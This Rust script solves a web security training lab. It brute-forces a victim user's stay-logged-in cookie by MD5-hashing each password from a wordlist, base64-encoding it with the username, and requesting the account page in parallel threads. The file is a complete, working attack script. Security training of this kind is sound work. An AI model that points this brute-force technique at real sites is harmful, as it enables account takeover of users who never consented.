/*************************************************************************
*
* Lab: Brute-forcing a stay-logged-in cookie
*
* Hack Steps: 
*      1. Read password list
*      2. Hash every the password
*      3. Encrypt every tha hash with the username in the cookie
*      4. Fetch carlos profile with every encrypted cookie
*
**************************************************************************/
use base64::{engine::general_purpose::STANDARD_NO_PAD, Engine};
use lazy_static::lazy_static;
use rayon::iter::{IntoParallelRefIterator, ParallelIterator};
use reqwest::{
    self,
    blocking::{Client, ClientBuilder, Response},
    redirect::Policy,
};
use std::{
    fs,
    io::{self, Write},
    sync::atomic::{AtomicBool, AtomicUsize, Ordering},
    time::{self, Duration, Instant},
};
use text_colorizer::Colorize;

// Change this to your lab URL
const LAB_URL: &str = "https://0a7f003903554f7181313e2c009a009a.web-security-academy.net";

lazy_static! {
    static ref COUNTER: AtomicUsize = AtomicUsize::new(0);
    static ref PASSWORD_IS_FOUND: AtomicBool = AtomicBool::new(false);
    static ref SCRIPT_START_TIME: Instant = time::Instant::now();
}

fn main() {
    print!("⦗1⦘ Reading password list.. ");

    let password_list = read_password_list("../../passwords.txt"); // Make sure the file exist in your root directory or change its path accordingly
    let total_count = password_list.iter().count();

    println!("{}", "OK".green());
    println!("⦗2⦘ Brute forcing carlos password.. ");

    let threads = 8; // You can experiment with the number of threads by adjusting this variable
    let mini_lists = build_mini_lists_for_threads(&password_list, threads);
    brute_force_password_in_multiple_threads(mini_lists, total_count);

    print_finish_message();
}

fn read_password_list(file_path: &str) -> Vec<String> {
    let passwords_big_string = fs::read_to_string(file_path)
        .expect(&format!("Failed to read the file: {}", file_path.red()));
    passwords_big_string.lines().map(|p| p.to_owned()).collect()
}

fn build_mini_lists_for_threads(big_list: &Vec<String>, threads: usize) -> Vec<Vec<String>> {
    let list_per_thread_size = big_list.len() / threads;
    big_list
        .chunks(list_per_thread_size)
        .map(|f| f.to_owned())
        .collect()
}

fn brute_force_password_in_multiple_threads(mini_lists: Vec<Vec<String>>, total_count: usize) {
    // Use every mini list in a different thread
    mini_lists.par_iter().for_each(|mini_list| {
        for password in mini_list {
            let is_found = PASSWORD_IS_FOUND.fetch_and(true, Ordering::Relaxed);
            if is_found {
                return; // Exit from the thread if the correct password was found
            } else {
                let password_hash = format!("{:x}", md5::compute(password));
                let cookie_encoded = STANDARD_NO_PAD.encode(format!("carlos:{password_hash}"));

                let login = fetch_with_cookie("/my-account", &cookie_encoded);
                if login.status().as_u16() == 200 {
                    println!("\n🗹 Correct password: {}", password.green());
                    PASSWORD_IS_FOUND.fetch_or(true, Ordering::Relaxed);
                    return;
                } else {
                    let counter = COUNTER.fetch_add(1, Ordering::Relaxed);
                    print_progress(counter, total_count, password)
                }
            }
        }
    })
}

fn fetch_with_cookie(path: &str, cookie: &str) -> Response {
    let client = build_web_client();
    client
        .get(format!("{LAB_URL}{path}"))
        .header("Cookie", format!("stay-logged-in={cookie}"))
        .send()
        .expect(&format!("⦗!⦘ Failed to fetch: {}", path.red()))
}

fn build_web_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}

fn print_progress(counter: usize, total_count: usize, password: &str) {
    let elapsed_time = (SCRIPT_START_TIME.elapsed().as_secs()).to_string();
    print!(
        "\r❯❯ Elapsed: {:2} seconds || Trying ({}/{total_count}): {:50}",
        elapsed_time.yellow(),
        counter + 1,
        password.blue()
    );
    io::stdout().flush().unwrap();
}

fn print_finish_message() {
    let elapsed_time = SCRIPT_START_TIME.elapsed().as_secs().to_string();
    println!("\n🗹 Finished in: {} seconds", elapsed_time.yellow());
    println!("🗹 The lab should be marked now as {}", "solved".green());
}
